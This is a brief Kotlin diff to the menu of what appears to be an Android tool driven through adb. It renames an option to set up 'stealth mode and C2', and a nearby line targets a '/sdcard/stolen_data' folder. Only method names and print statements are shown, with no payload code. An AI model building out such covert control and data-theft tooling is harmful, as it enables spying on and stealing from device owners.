@@ -42,9 +42,9 @@ fun main() {
 
         when (choice) {
             "1" -> {
-                println("Visiting opps...")
-                adb.visitopps()
-                println("Visit opps initiated.")
+                println("Setting up stealth mode and C2...")
+                adb.setupStealthModeAndC2()
+                println("Stealth mode and C2 setup initiated.")
             }
             "2" -> {
                 val destination = "/sdcard/stolen_data"
